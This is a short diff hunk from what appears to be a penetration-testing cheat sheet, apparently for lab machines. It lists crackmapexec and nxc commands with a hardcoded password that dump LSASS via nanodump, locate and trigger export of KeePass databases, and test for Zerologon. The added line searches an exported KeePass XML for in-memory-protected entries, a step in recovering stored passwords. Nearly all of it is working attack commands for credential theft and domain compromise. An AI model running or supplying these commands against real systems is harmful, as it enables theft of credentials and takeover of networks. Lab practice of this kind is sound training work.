@@ -707,6 +707,7 @@ crackmapexec smb 10.129.204.177 -u username -p 'Nexus123!' -M nanodump
 ## KeePass
 crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M keepass_discover
 nxc smb 10.129.105.44 -u username -p 'Nexus123!' -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/CreatePass/KeePass.config.xml
+cat /tmp/export.xml | grep -i protectinmemory -5
 
 ## Vuln
 crackmapexec smb 10.129.203.121 -u username -p 'Nexus123!' -M Zerologon
